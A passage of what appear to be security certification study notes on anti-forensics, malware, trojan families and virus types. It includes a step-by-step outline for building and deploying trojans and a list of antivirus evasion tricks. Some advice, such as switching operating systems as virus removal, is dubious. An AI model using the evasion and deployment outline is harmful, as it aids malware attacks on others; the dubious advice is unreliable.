			- Steganography : Attackers use steganography to hide information when encryption is unfeasible. Attackers can embed information such as the source code for a hacking tool, a list of compromised servers, plans for future attacks, and communication or coordination channels as part of a steganographic attempt.
			- Data Hiding in File System Structures : Data hiding is an anti-forensic technique employed by attackers to render data inaccessible. $BadClus is a sparse file that allows attackers to hide unlimited data, as they can allocate additional clusters to $BadClus to conceal more data. Some hard disks have Host-Protected Areas (HPAs), where developers can store data they want to protect (and hide) from normal use. An attacker with malicious intent can exploit these areas to hide illicit data. In addition to these techniques, attackers use DPAs (Data Partition Areas) and slack spaces to hide data that are not visible to either the BIOS or the operating system, requiring special tools to detect and view.
			- Minimizing Footprint : Attackers often leave minimal or no footprints after executing an attack. The goal is to carry out the attack without raising alarms and then eliminate all traces of their actions. To minimize footprints, attackers utilize various resources, such as stolen identities, virtual machines, cloud infrastructure, untraceable cryptocurrencies, and running operating systems from Live USBs or External HDD.
			- Trail Obfuscation : The purpose of trail obfuscation is to delete evidence and conceal the traces of malicious activities to evade detection by defensive systems. Attackers perform trail obfuscation through log tampering, generating false email headers, modifying timestamps, and altering various file headers. Tools such as Timestomp and Transmogrify are used by attackers to modify, edit, and delete date and time metadata on files, making it difficult for security professionals to trace the attacker’s origin.
				- Trail obfuscation using other tools and techniques:
					- Log cleaners
					- Zombie accounts
					- Spoofing
					- Trojan commands
					- Misinformation
			- Artifact Wiping : Artifact wiping refers to the process of permanently deleting or destroying evidence data using file-wiping and disk-cleaning utilities, disk degaussing/destruction, and disk formatting techniques. The primary purpose of artifact wiping is to eliminate traces of unauthorized activities on a computer system or storage device, making it difficult for security professionals to accurately reconstruct events and identify the culprit.
				- Attackers use various tools for artifact wiping:
					- BCWipe
					- Total WipeOut
					- DriveScrubber
					- Disk Wipe
					- KillDisk
					- R-Wipe & Clean
					- BitRaser File Eraser
					- Blancco File Eraser
			- Overwriting Data/Metadata : Data overwriting is one of the most common and widely used anti-forensic techniques employed by attackers. In this technique, attackers overwrite all addressable locations on digital storage media with random characters. They may also use standard data-wiping tools and techniques, such as simple deletion, data shredding, and data wiping, which perform multiple overwrites on the media to cover their tracks. As a result, it becomes difficult for security professionals and defensive systems to retrieve traces of the attack from the digital media.
			- Program Packers : Attackers use program packers to hide their data by compressing files with various cryptographic algorithms. This technique allows attackers to conceal evidence files in containers, making them difficult to detect. Password-protected program packers can present a challenge for security professionals, as they must first decrypt the password to unpack the file. These packers also help attackers conceal tools used in the attack, making it harder to trace them through reverse engineering attempts.
				- Attackers use various packers:
					- UPX
					- PECompact
					- BurnEye
					- Exe Stealth Packer
					- Smart Packer Pro
			- Access Anonymization : Access anonymization refers to techniques used by attackers to hide their digital footprints by anonymizing their access to systems, networks, or data. This process aims to make it more difficult for security professionals to trace malicious activities back to specific individuals or entities. Attackers use tools such as proxy servers, anonymization services, Tor networks, traffic padding, and anonymous communication channels for access anonymization.
	- Track-Covering Tools: Track-covering tools help attackers clean up all traces of computer and internet activities on the target system. These tools free cache space, delete cookies, clear internet history and shared temporary files, erase logs, and discard junk files.
		- CCleaner : CCleaner is a system optimization, privacy, and cleaning tool. It removes traces of temporary files, unused files, log files, registry entries, memory dumps, and online activities such as internet history.
		- DBAN : Delete information stored on hard disk drives (HDDs, not SSDs) and remove viruses and spyware from Microsoft Windows installations.
		- Privacy Eraser Free : A single, all-encompassing privacy suite that cleans up internet browsing history, cookies, saved passwords, recent documents, clipboard data, Windows run history, etc.
		- Wipe : Efficiently managing storage space by removing temporary files, caches, cookies, and browsing history. Additionally, eliminating unnecessary data minimizes the risk of unauthorized access, ensuring online activities remain confidential and protected from potential threats (privacyroot.com)
		- BleachBit : BleachBit is an open-source tool designed for Linux and Windows systems. It frees cache, deletes cookies, clears internet history, shreds temporary files, deletes logs, and discards junk. It wipes clean traces from thousands of applications, including Firefox, Adobe Flash, Google Chrome, Opera, and more. Beyond simply deleting files, BleachBit includes advanced features such as shredding files to prevent recovery, wiping free disk space to hide traces of files deleted by other applications, and vacuuming Firefox to improve its performance.
		- east-tec Eraser : east-tec Eraser is a privacy protection software that erases all files that store evidence of computer and internet activities. It helps keep PC clean by deleting large amounts of unnecessary data stored on computer, with or without approval.

# Malware Threats

- Malware
	- Malware is malicious software designed to damage or disable computer systems, giving the malware creator limited or full control over the system for malicious activities such as theft or fraud. It may delete files, slow down computers, steal personal information, send spam, or commit fraud.
	- Techniques for Distributing Malware on the Web (Security Threat Report - www.sophos.com):
		- Black Hat Search Engine Optimization (SEO) : Black hat SEO (also referred to as unethical SEO) uses aggressive SEO tactics, such as keyword stuffing, inserting doorway pages, page swapping, and adding unrelated keywords, to get higher search engine rankings for malware pages.
		- Social Engineered Click-jacking : Attackers inject malware into websites that appear legitimate to trick users into clicking them. When clicked, the malware embedded in the link executes without the user's knowledge or consent.
		- Spear-phishing Sites : This technique is used to mimic legitimate institutions, such as banks, to steal passwords, credit card and bank account information, and other sensitive data.
		- Malvertising : This technique involves embedding malware-laden advertisements in legitimate online advertising channels to spread malware to the systems of unsuspecting users.
		- Compromised Legitimate Websites : Often, attackers use compromised websites to infect systems with malware. When an unsuspecting user visits the compromised website, they unknowingly install the malware on their system, after which the malware performs malicious activities.
		- Drive-by Downloads : This refers to the unintentional downloading of software via the Internet. In this case, an attacker exploits flaws in browser software to install malware simply by visiting a website.
		- Spam Emails : The attacker attaches a malicious file to an email attachment or embeds the malware in the email body and sends the email to multiple target addresses. The victim is tricked into clicking the attachment, thus executing the malware and compromising their machine.
		- Rich Text Format (RTF) Injection : RTF injection involves exploiting features of Microsoft Office, such as RTF template files stored locally or on a remote machine. RTF templates are used to specify the document format. Attackers inject malicious macros into RTF files and host them on their servers. When a user opens the document, the malicious template is automatically retrieved from the remote server, evading security systems.
	- Components of Malware Malware:
		- Crypter : It is a software program designed to conceal the existence of malware. Attackers use this software to evade antivirus detection and protect the malware from reverse engineering or analysis, making it difficult for security mechanisms to detect.
		- Downloader : It is a type of Trojan that downloads other malware or malicious code and files from the Internet. Usually, attackers install a downloader when they first gain access to a system.
		- Dropper : It is a covert carrier of malware. Attackers embed malicious malware files inside droppers, which can perform the installation task covertly. Attackers must first install the malware program or code on the system to execute the dropper. The dropper can transport malware and execute it on a target system without being detected by antivirus scanners.
		- Exploit : It is the part of the malware that contains code or a sequence of commands that can take advantage of a bug or vulnerability to breach the system’s security. Based on the type of vulnerabilities exploited, exploits are categorized into local exploits and remote exploits.
		- Injector : This program injects exploits or malicious code from the malware into other vulnerable running processes and alters the execution method to hide or prevent its removal.
		- Obfuscator: It is a program that conceals the malicious code of malware using various techniques, making it difficult for security mechanisms to detect or remove it.
		- Packer: This software compresses the malware file, converting the code and data into an unreadable format. It uses compression techniques to pack the malware.
		- Payload : It is the part of the malware that performs the desired activity when activated. It may be used to delete or modify files, degrade system performance, open ports, change settings, etc., in order to compromise system security.
		- Malicious Code : This is a piece of code that defines the basic functionality of the malware and contains commands that lead to security breaches.
	- Potentially Unwanted Applications (PUAs):
		- Potentially unwanted applications or programs (PUAs or PUPs), also known as grayware or junkware, are potentially harmful applications that may pose significant risks to the security and privacy of data stored on the system where they are installed.
		- Types of PUAs:
			- Adware : These PUAs display unsolicited advertisements offering free sales, issue bogus reminders about outdated software or OS, and show pop-ups for online services while browsing websites. They may disrupt normal activities and lure victims into clicking on malicious URLs.
			- Torrent : When using torrent applications to download large files, the user may be compelled to download unwanted programs that have peer-to-peer file sharing features.
			- Marketing : Marketing PUAs track users' online activities and transmit browser details along with information about personal interests to third-party app owners. These applications then use this data to market products and resources tailored to users’ preferences.
			- Cryptomining : Cryptomining PUAs exploit victims' system resources and may access financial data to perform digital cryptocurrency mining, such as generating bitcoins.
			- Dialers : Dialers, or spyware dialers, are programs that automatically install and configure themselves on a system to make calls to a set of contacts at various locations without the user's consent. These dialers can result in massive telephone bills and are often difficult to detect and remove.
- Advanced Persistent Threats
	- Advanced Persistent Threats (APTs) are a type of network attack in which an attacker gains unauthorized access to a target network and remains undetected for an extended period. The primary objective of APTs is to steal sensitive information rather than to sabotage the organization or its network.
- Trojan
	- A Trojan is a program that conceals malicious or harmful code within an apparently harmless program or data, which can later gain control of the system and cause damage. Trojans are activated when a user performs certain predefined actions.
	- Trojans operate with the same level of privileges as the victim. For instance, if a victim has the privileges to delete files, transmit information, modify existing files, or install programs (including those that provide unauthorized network access or execute privilege escalation attacks), the Trojan, once it infects the system, inherits these privileges. Additionally, it may attempt to exploit vulnerabilities to gain even higher levels of access than the user running it.
	- Trojans Are Used For:
		- Steal sensitive information such as account data, including login credentials, email addresses, and passwords.
		- Record screenshots, audio, and video from the victim's PC.
		- Disable firewalls and antivirus software.
		- Create backdoors to gain remote access.
		- Exploit the victim's PC as a proxy server for relaying attacks.
		- Use the victim's PC as part of a botnet to carry out DDoS (Distributed Denial of Service) attacks.
		- Generate fake traffic to execute DoS (Denial of Service) attacks.
		- Use the victim's PC for spamming and sending bulk email messages.
		- Delete or replace critical operating system files.
		- Encrypt the victim's machine, rendering it inaccessible to the victim, and prevent access to its contents.
	- Common Ports Used by Trojans:
		- Ports serve as entry and exit points for data traffic. There are two types of ports: hardware ports and software ports. In an operating system, ports are software-based and typically function as entry and exit points for application traffic.
	- Types of Trojans:
		- Remote Access Trojans:
			- Remote Access Trojans (RATs) provide attackers with full control over the victim's system, allowing them to remotely access files, private conversations, accounting data, and more. The RAT functions as a server and listens on a port that is typically not meant to be accessible to internet attackers.
			- Remcos RAT : Remcos RAT (Remote Control and Monitoring System) is a powerful remote access trojan (RAT) designed to provide attackers with full control over an infected system. It is typically used for cyber espionage, theft of sensitive data, or other malicious activities. Key features of Remcos RAT include remote control, keylogging, screen capture, audio and video recording, file management, persistence, password stealing, data exfiltration, proxies and VPNs, and encryption.
			- Additional RATs: Parallax RAT, AsyncRAT, Xeno RAT, Kedi RAT, AhMyth, MagicRAT, NetSupport RAT, StrRAT and Ratty, MINEBRIDGE
		- Backdoor Trojans:
			- A backdoor is a program that allows unauthorized access to a system by bypassing standard authentication mechanisms or conventional security measures, such as IDS and firewalls, without detection. Backdoors are used by attackers for uninterrupted access to the target machine. In these types of breaches, hackers exploit backdoor programs to gain access to the victim's computer or network.
			- TinyTurla-NG (TTNG) : TinyTurla-NG (TTNG) is a backdoor Trojan operated by the Turla APT group, a Russian cyber-espionage threat actor. This backdoor Trojan enables attackers to gain remote access and control over infected systems, facilitating the exfiltration of sensitive data, execution of commands, and the conduct of various malicious activities. Attackers use compromised WordPress-based websites as command-and-control (C2) endpoints for the TTNG backdoor.
			- Additional Backdoor Trojans: SmokeLoader, BazarLoader, Kovter, POWERSTATS v3, RogueRobin, ServHelper, SpeakUp linux backdoor, Winnti backdoor, Daxin, SysJoker, PortDoor, GoldenSpy
		- Botnet Trojans:
			- Attackers, also known as "bot herders," use botnet Trojans to infect a large number of computers across a wide geographical area, creating a network of bots (or a "bot herd") that can be controlled via a command-and-control (C&C) center.
			- RDDoS : RDDoS is a botnet Trojan capable of executing commands and carrying out DDoS attacks on target systems. It leverages online parameters that enable attackers to differentiate between types of infected devices. Additionally, it can distinguish between sandboxes and real devices based on the operating parameters embedded in the online packages.
			- Additional Botnet Trojans: Horabot, hailBot, kiraiBot, catDDoS, ZeroBot, XorDdos, Nexus Android botnet, Satori, Torii botnet, Qakbot, Hide n Seek, Ramnit, Panda, BetaBot
		- Rootkit Trojans:
			- A "rootkit" combines "root" (administrator access) and "kit" (tools for gaining access). It is a powerful backdoor that targets the root or OS, providing attackers full control. Unlike typical backdoors, rootkits are hard to detect, as they do not appear in services, task lists, or registries.
			- Reptile Rootkit : Reptile is a kernel module rootkit primarily designed to target Linux-based systems. It offers advanced features, including a reverse shell and the ability to conceal its presence. Attackers can use the reverse shell to gain control of the target system.
			- Additional Rootkit Trojans: CEIDPageLock, Wingbird, GrayFish, Finfisher, ZeroAccess, Whistler, Fire Chili rootkit, Purple Fox Rootkit, Dubbed Demodex Rootkit, MoonBounce, Moriya, iLOBleed
		- E-Banking Trojans:
			- E-banking Trojans are a major threat to online banking. They intercept the victim's account information before it is encrypted and sent to the attacker's command-and-control center. Banking Trojans steal users' information through methods such as keylogging, form data capture, inserting fraudulent form fields, screen captures, video recording, mimicking financial websites, redirecting to banking sites, and man-in-the-middle attacks.
			- CHAVECLOAK : CHAVECLOAK is a banking Trojan that uses advanced techniques to exfiltrate financial data from targeted users. The attack begins with the download of a malicious ZIP file disguised as a PDF, which then employs methods like DLL side-loading to execute the malware.
			- Additional E-Banking Trojans: Grandoreiro, Ursnif (Gozi), Nexus, DanaBot, QakBot (Qbot), Ramnit, IcedID, Emotet
		- Point-of-Sale Trojans:
			- As the name suggests, point-of-sale (POS) Trojans are financial malware that target POS and payment devices like credit/debit card readers. Attackers use POS Trojans to compromise these devices and steal sensitive information, such as credit card numbers, cardholder names, and CVV codes.
			- Prilex POS : Prilex is a Brazilian threat actor group that primarily targets POS terminals to steal sensitive information. The attackers often pose as POS technicians, tricking targets into installing malicious software disguised as a required update. They may either visit stores in person as technical specialists or request remote access by having vendors install remote desktop apps like AnyDesk.
			- Additional POS Trojans: LockPOS, BlackPOS, FastPOS, PunkeyPOS, CenterPOS, MalumPOS
		- Defacement:
			- Defacement Trojans, once spread through a system, can destroy or alter database content. They are particularly dangerous when targeting websites, as they modify the underlying HTML, altering the site's content.
			- Restorator : Restorator is a utility for editing Windows resources in applications and components (e.g., .exe, .dll, .res, .rc, and .dcr files). It enables users to modify, add, or remove resources like text, images, icons, sounds, videos, versions, dialogs, and menus in most programs. This tool is useful for translation, localization, customization, design enhancement, and development.
		- Service Protocol Trojans:
			- Service Protocol Trojans exploit vulnerable service protocols like VNC, HTTP/HTTPS, and ICMP to attack the victim’s machine.
			- VNC Trojans : A VNC Trojan starts a VNC server daemon on the victim's system, allowing the attacker to connect via any VNC viewer. Since VNC is a legitimate utility, this Trojan is difficult for antivirus software to detect. Well-known financial malware like Vultur, Dridex, and Gozi use a hidden virtual network computing (HVNC) module, enabling attackers to gain user-level access to an infected PC.
			- HTTP/HTTPS Trojans : HTTP/HTTPS Trojans bypass firewalls by working in reverse, unlike a standard HTTP tunnel. They use web-based interfaces and port 80. The Trojan executes on the internal host, spawning a child program at a scheduled time. Since the child program appears as a legitimate user to the firewall, it is granted internet access. However, it then runs a local shell, connects to the attacker’s web server via a seemingly legitimate HTTP request, and sends a ready signal.
			- SHTTPD : SHTTPD is a lightweight HTTP server that can be embedded into any program. It can be wrapped in a legitimate program (e.g., chess.exe), and when executed, it turns the computer into an invisible web server.
			- HTTP RAT : HTTP RAT uses web interfaces and port 80 to gain access, functioning like an HTTP tunnel but in reverse. These Trojans are particularly dangerous as they can operate virtually anywhere with internet access.
			- ICMP Trojans : The Internet Control Message Protocol (ICMP) is an essential part of IP, required for all IP modules. It is a connectionless protocol that sends error messages to unicast addresses and encapsulates packets within IP datagrams.
		- Mobile Trojans:
			- Mobile Trojans are malicious apps that target mobile phones. The attacker tricks the victim into installing the app, which then performs various attacks, including stealing banking and social networking credentials, encrypting data, and locking the device.
			- Chameleon : Chameleon is a banking Trojan targeting Android devices, distributed through various methods, primarily phishing pages. It adapts to multiple commands, including verifying app package names, and mainly targets mobile banking apps. By using the proxy feature, it can manipulate the device as the victim, enabling attackers to carry out device takeover (DTO) and account takeover (ATO) attacks through Accessibility Service privileges.
			- Additional Mobile Trojans: Vultur, PixPirate, GoldPickaxe, GoldDigger, SpyNote, Anatsa, Xenomorph
		- IoT Trojans:
			- The Internet of Things (IoT) refers to the interconnection of physical devices, buildings, and other items embedded with electronics. IoT Trojans are malicious programs that target IoT networks, using a botnet to attack other machines outside the network.
			- OpenSSH Trojan : Microsoft researchers have uncovered a sophisticated cyberattack targeting Linux-based systems and IoT devices exposed to the internet. The attackers exploited a modified version of OpenSSH to gain control and install cryptomining malware. A backdoor was deployed to run malicious tools, including rootkits and an IRC bot, hijacking the compromised devices' computing resources for cryptomining.
			- Additional IoT Trojans: Ttint, XorDdos, Mozi, Silex BrickerBot, Torii botnet, Bashlite IoT Malware, Gafgy Botnet, Katana, BotenaGo, Dark Nexus
		- Security Software Disabler Trojans: 
			- Security software disabler Trojans disable security programs like firewalls and IDS by either shutting them down or killing their processes. These entry Trojans pave the way for attackers to launch subsequent attacks on the target system.
			- Security Software Disabler Trojans: Chameleon, CertLock, GhostHook
		- Destructive Trojans:
			- Destructive Trojans are designed solely to delete files on a target system. Often undetected by antivirus software, they randomly delete files, folders, registry entries, and data on local and network drives, potentially causing OS failure.
			- Destructive Trojans: SilverRAT, HermeticWiper, WhisperGate, FoxBlade
		- DDoS Attack Trojans:
			- These Trojans are designed to carry out DDoS attacks on target machines, networks, or websites. They turn the victim into a zombie, awaiting commands from a DDoS server on the internet.
			- Mirai IoT botnet Trojan : The Mirai IoT botnet Trojan remains one of the most notorious DDoS attack Trojans.
			- DDoS attack Trojans: RDDoS, Horabot, hailBot, kiraiBot, and catDDoS
		- Command Shell Trojans:
			- A command shell Trojan provides remote control of a victim's machine by installing a Trojan server that opens a port for the attacker to connect. The attacker’s machine runs the client to launch the command shell on the victim's system.
			- Command Shell Trojans: Netcat, DNS Messenger, GCat
	- Infect Systems Using Trojan:
		- Step 1: Creating Trojan:
			- Attackers can create Trojans using various Trojan horse construction kits, such as DarkHorse Trojan Virus Maker, njRAT, and Trojan Horse Construction Kit. Crafting a new Trojan packet enhances the likelihood of successfully compromising the target system, as security mechanisms may fail to detect it. These Trojans can be delivered to the victim’s machine via a dropper or downloader.
			- Trojan Horse Construction Kits: DarkHorse Trojan Virus Maker, njRAT, Trojan Horse Construction Kit, Social Engineering Toolkit (SET), THorse, Senna Spy Trojan Generator, THOSE RAT, Umbra Loader - Botnet Trojan Maker, VenomRAT
			- njRAT : njRAT is a remote access trojan (RAT) with robust data-stealing capabilities. It can log keystrokes, access a victim's camera, steal credentials stored in browsers, upload and download files, perform process and file manipulations, and view the victim's desktop. Additionally, this RAT can be used to control botnets (networks of compromised computers), enabling attackers to update, uninstall, disconnect, restart, and close the RAT, as well as rename its campaign ID.
		- Step 2: Employing a Dropper or Downloader:
			- After creating Trojans, attackers use droppers like Amadey or SecuriDropper, or downloaders like Downloader.DN, to deliver them to the victim’s machine. Droppers appear as legitimate files but execute hidden malware without saving it to disk, often using decoys like images or games. Downloaders, by contrast, contain links to retrieve the Trojan from an attacker’s server. While droppers evade firewalls, downloaders are more susceptible to detection using network analyzer tools.
			- Droppers : Droppers are programs designed to conceal malware payloads that disrupt target systems. They often include features to evade antivirus detection and perform stealthy installations. Droppers load their code into memory, extract the malware payload, write it to the file system, and then execute the payload to initiate the malware installation.
			- Droppers: Amadey, SecuriDropper, PindOS JavaScript dropper, SharkBot, Dropper.AIF, NullMixer
			- Downloaders : A downloader is a program designed to download and install harmful software, such as malware. Unlike droppers, downloaders do not carry malware themselves, which allows new or unknown downloaders to bypass anti-malware scanners. Attackers use downloaders as part of a payload or alongside other harmful programs to stealthily install malware. Downloaders are often disguised as legitimate files, such as "accounts.exe" or "invoices," and attached to emails.
			- Downloaders: Fruity Trojan downloader, Downloader.DN, InfoStealer.XY, sLoad
		- Step 3: Employing Wrapper:
			- Wrappers bind Trojan executables with legitimate-looking .EXE files, such as games or office software. When run, the Trojan installs in the background while the legitimate program runs in the foreground. Tools like petite.exe can compress and conceal Trojans, helping them bypass antivirus detection. Wrappers can also bundle multiple executables, with some running hidden processes alongside visible ones.
			- Covert Wrapper Programs - IExpress Wizard : The IExpress Wizard is a wrapper tool that helps users create self-extracting packages capable of automatically installing embedded files, including setup files or Trojans. IExpress can delete the setup files after execution, erasing traces of the Trojan. It can also run a program or extract hidden files. These embedded Trojans often evade detection by antivirus software.
			- Wrapper Tools: GuLoader, RDP Wrapper & Autoupdate, SystemBC, Trickbot, FinFisher
		- Step 4: Employ Crypter:
			- Attackers use a crypter, such as The Attacker-Crypter, to encrypt a Trojan and evade detection by firewalls and IDS. A crypter is software that encrypts the original binary code of an .exe file. It allows attackers to hide viruses, spyware, keyloggers, RATs, and other malicious software, making them undetectable by antivirus programs.
			- Attacker-Crypter : AttackerCrypter can encrypt executables to bypass traditional detection mechanisms using various techniques. It also allows attackers to execute custom PowerShell code or select the desired payload type through its interface. Additionally, it can notify the attacker of the methods being executed on the target system.
			- Crypter Tools: Muck Crypter, Pure Crypter, DarkTortilla, Line Crypter, Trickbot/Conti
		- Step 5: Propagating and Deploying Trojan:
			- After creating a Trojan and using a dropper/downloader, wrapper, and crypter, the attacker must transfer and deploy the package on the target machine. The Trojan can be propagated through various methods, including overt and covert channels, exploit kits, emails, USB drives, proxy servers, and instant messaging, tricking users into downloading and executing it. Once active, the Trojan can perform malicious actions, such as displaying annoying pop-ups, altering desktops, modifying or deleting files, stealing data, and creating backdoors.
			- Covert Channels Tools: Racoon , QEMU, ELECTRICFISH
			- Proxy Server Trojans: SocksEscort, QakBot, Stantinko Botnet
			- Propagate and Deploy Trojans: Lord, Underminer Exploit Kit, RIG Exploit kit, Magnitude, Angler, Fallout, Nuclear, Neutrino, Terror, Sundown
	- Techniques for Evading Antivirus Software:
		- Break the Trojan file into multiple parts and zip them into a single file.
		- Always create a custom Trojan and embed it into an application, as antivirus programs may fail to recognize new Trojans due to the absence of their signatures in the database.
		- Modify the Trojan's syntax:
			- Convert the .EXE file to a VBScript.
			- Rename the .EXE extension to .DOC.EXE, .PPT.EXE, or .PDF.EXE. Since Windows hides "known extensions" by default, these files will appear as .DOC, .PPT, or .PDF, disguising their true nature.
		- Modify the Trojan's content using a hex editor to alter its binary code, making it harder for antivirus programs to detect.
		- Alter the checksum and encrypt the file to prevent detection by antivirus software, as this changes the file's signature and makes it appear different.
		- Avoid using Trojans downloaded from the web, as antivirus software can easily detect these pre-existing versions.
		- Use binder and splitter tools to modify the first few bytes of Trojan programs, making them harder for antivirus software to detect.
		- Perform code obfuscation or morphing to disguise the Trojan's true functionality, making it harder for antivirus software to distinguish between malicious and harmless programs.
	- Exploit Kits:
		- An exploit kit, also known as a crimeware toolkit, is used to exploit security vulnerabilities in software applications, such as Adobe Reader and Adobe Flash Player. These kits distribute malware, including spyware, viruses, Trojans, worms, bots, backdoors, buffer overflow scripts, or other malicious payloads, to the target system. Exploit kits come with pre-written exploit code, making them easy to use even for attackers without advanced IT or security expertise. Additionally, they provide a user-friendly interface to track infection statistics and a remote mechanism to control compromised systems.
		- BotenaGo Exploit Kit : The BotenaGo exploit kit, written in the Go programming language, contains over 30 variants of exploits and is capable of attacking millions of IoT and routing devices worldwide. BotenaGo was first discovered in November 2021 and was initially detected as Mirai botnet malware by antivirus software. After successfully embedding a backdoor in a victim's device, attackers can exploit the device using preconfigured exploit functions in the source code.
	- Exploit Kits: Lord, Underminer Exploit Kit, RIG Exploit kit, Magnitude, Angler, Fallout, Nuclear, Neutrino, Terror, Sundown
- Viruses
	- A virus is a self-replicating program that creates copies of itself by attaching to another program, a computer's boot sector, or a document. Viruses are commonly transmitted through file downloads, infected disks or flash drives, and email attachments. Indications of a virus attack include frequent antivirus alerts, unusual hard drive activity, reduced storage space, and the appearance of unwanted pop-up windows.
	- Types of Viruses : Viruses are categorized based on their functionality and targets.
		- System or Boot Sector Virus:
			- The most common virus targets are system sectors, including the master boot record (MBR) and DOS boot sector, as these are critical during system booting. MBRs are especially vulnerable since their corruption can cause complete data loss. System sectors are only 512 bytes, so viruses hide their code elsewhere on the disk. Boot sector viruses, often spread via email attachments and USB drives, reside in memory and sometimes infect files, making them multipartite. These viruses move the MBR to a new location, placing their code in the original spot, ensuring their execution before the MBR during booting.
			- Virus Removal: System sector viruses often create the illusion that the system is virus-free. One way to address these viruses is to avoid using the Windows operating system and switch to Linux or macOS, as Windows is more susceptible to such attacks. Linux and macOS have built-in safeguards that offer better protection against these viruses. Another effective approach is to perform regular antivirus scans to detect and remove infections.
		- File Virus:
			- File viruses infect executable or interpreted files such as COM, EXE, SYS, OVL, OBJ, PRG, MNU, and BAT files. They can be either direct-action (non-resident) or memory-resident. File viruses insert their code into executable files, typically targeting those with extensions like .COM or .EXE. When the infected program runs, the virus executes alongside it, spreading to other files.
			- These viruses are challenging to remove because overwriting them renders the original program unusable. Some file viruses save the program's original instructions, allowing it to execute normally and concealing the infection. Using stealth techniques, they hide in memory and prevent detection, showing no file length increase during directory listings. They can also intercept file read requests, returning the original file to the user to avoid suspicion. File viruses are versatile and capable of infecting many file types due to the variety of infection techniques available.
		- Multipartite Virus:
			- A multipartite virus, also known as a multipart or hybrid virus, combines the characteristics of file infectors and boot record infectors, targeting both the boot sector and executable files simultaneously. When the virus infects the boot sector, it can spread to system files, and infected system files can, in turn, reinfect the boot sector. This type of virus repeatedly reinfects the system if it is not completely eradicated.
		- Macro Virus:
			- Macro viruses infect applications like Microsoft Word by automatically executing actions when triggered. Most are written in Visual Basic for Applications (VBA) and target templates or convert infected documents into template files, disguising themselves as regular documents
			- Although generally less harmful than other viruses, macro viruses often spread via email. Pure data files cannot spread viruses, but users may overlook the distinction between data and executable files due to the extensive use of macro languages in programs. This blurring occurs when default macros are set to run automatically upon loading a file, creating an opportunity for exploitation. Virus writers target universal programs with macro capabilities, such as Microsoft Word, Excel, and other Office applications, as well as Windows Help files, which can also contain macro code.
		- Cluster Virus:
			- Cluster viruses infect files without altering them or creating additional files. They store their code on the hard drive and overwrite directory entry pointers, redirecting the disk read process to the virus code instead of the intended program. Although this modification affects all programs, only one copy of the virus exists on the disk.
			- A cluster virus, such as Dir-2, executes itself when any program is launched, then passes control to the actual program. If the virus infects memory, it manipulates access to the disk's directory structure. Booting from a clean USB drive and running utilities like CHKDSK can reveal issues, such as cross-linked files. Accepting the utility's offer to "fix" these problems can cause the virus to spread, infecting all executable files, leading to data loss or uniform file sizes.
		- Stealth/Tunneling Virus:
			- Stealth viruses evade antivirus detection by altering service call interrupts and replacing system requests with their own code. They provide false information to conceal their presence, hiding modifications and taking control of system functions. For example, they can hide file size changes or temporarily relocate a copy of themselves to another drive, replacing the infected file with an uninfected one.
			- These viruses also reside in memory and control system functions that read files or sectors. When a program requests modified information, the virus provides false data to the requesting program. Rootkits, often carriers of stealth viruses, are installed by Trojans and allow the virus to hide and persist undetected.
			- Virus Removal:
				- Always perform a cold boot (boot from a write-protected USB).
				- Avoid using DOS commands like FDISK to fix the virus.
				- Use antivirus software for detection and removal.
		- Encryption Virus:
			- Encryption viruses, or cryptolocker viruses, infiltrate systems via freeware, shareware, torrents, fake ads, email spam, and more. These viruses consist of an encrypted copy and a decryption module, with the decryption module remaining constant while the encryption uses different keys.
			- When the virus is injected into the system, the decryption module executes first, decrypting the virus body, which then replicates or becomes resident on the machine. Each infected file is encrypted with a unique key using XOR with a randomized key. These viruses block access to the system or limit functionality, using encryption to evade detection by virus scanners. While virus scanners can't detect the encrypted virus via signatures, they can identify the decryption module.
		- Sparse Infector Virus:
			- Sparse infector viruses spread infection by minimizing their chance of detection. These viruses infect infrequently, only under specific conditions or when file sizes fall within a certain range.
			- The sparse infector virus operates in two ways:
				- It replicates occasionally (e.g., every tenth program executed or on a specific day of the week).
				- It selects files to infect based on set conditions (e.g., infecting files under 128 KB in size).
			- For example, an attacker may send a sparse infector virus to a target machine, setting it to execute on the 15th day of every month. This tactic reduces the likelihood of detection by antivirus software, allowing the virus to infect the system successfully.
		- Polymorphic Virus:
			- Polymorphic viruses encrypt their code and use a decryption module to decode it during infection. To avoid detection, these viruses modify their code each time they replicate by altering both the encryption module and the instruction sequence. Random number generators drive this process.
			- A polymorphic virus consists of three components: the encrypted virus code, the decryptor routine, and the mutation engine. The decryptor routine decrypts the virus code after gaining control of the system, while the mutation engine generates random decryption routines that change with each infection.
			- When a program infected with a polymorphic virus is executed, the decryptor takes control, decrypting the virus code and mutation engine. The virus then replicates in RAM and generates new, randomized decryption routines for further infections. This encryption and mutation process makes polymorphic viruses difficult to detect, as no two infections appear the same to antivirus software.
		- Metamorphic Virus:
			- Metamorphic viruses are designed to completely rewrite themselves each time they infect a new executable file. These sophisticated viruses use metamorphic engines to reprogram their code, translating it into a temporary variant before converting it back to the original code. This technique maintains the original algorithm while avoiding detection by antivirus software through pattern recognition. Metamorphic viruses are more advanced and effective than polymorphic viruses.
			- The transformation of virus bodies depends on the technique employed, with methods for metamorphosing viruses:
				- Disassembler
				- Expander
				- Permutator
				- Assembler
			- Virus bodies are transformed through the following steps:
				- Inserts dead code
				- Reshapes expressions
				- Reorders instructions
				- Modifies variable names
				- Encrypts program code
				- Modifies program control structure
		- Overwriting File or Cavity Virus:
			- Some programs contain empty spaces. Cavity viruses, also known as space fillers, overwrite part of the host file with a constant value (usually nulls) without increasing the file size, thus preserving its functionality. By maintaining a constant file size during infection, the virus can evade detection. Cavity viruses are rarely encountered due to the limited availability of suitable hosts and the complexity of their code.
			- A new design for Windows files, called the Portable Executable (PE) format, improves program loading speeds. However, it creates a gap in the file during execution, which cavity viruses can exploit to insert themselves.
		- Companion Virus/Camouflage Virus:
			- The companion virus stores itself with the same filename as the target program file. It infects the computer when the file is executed and modifies the hard disk data. Companion viruses use DOS to run COM files before EXE files. The virus installs an identical COM file and infects EXE files.
			- Here’s how it works: Suppose a companion virus is running on the PC and decides to infect a file. It looks around and finds a file called notepad.exe. It then creates a file called notepad.com, which contains the virus. The virus typically places this file in the same directory as the .exe file, although it can also place it in any directory on the DOS path. When typing "notepad" and pressing Enter, DOS executes notepad.com instead of notepad.exe (DOS executes COM files first, followed by EXE, then BAT files with the same root name if they are in the same directory).
			- The virus runs, potentially infecting more files, before finally loading and executing notepad.exe. The user is likely to fail to notice any issues. A companion virus can be easily detected by the presence of the extra COM file in the system.
		- Shell Virus:
			- The shell virus code forms a shell around the target host program’s code, making itself the original program and treating the host code as a subroutine. Nearly all boot sector viruses are shell viruses.
		- File Extension Virus:
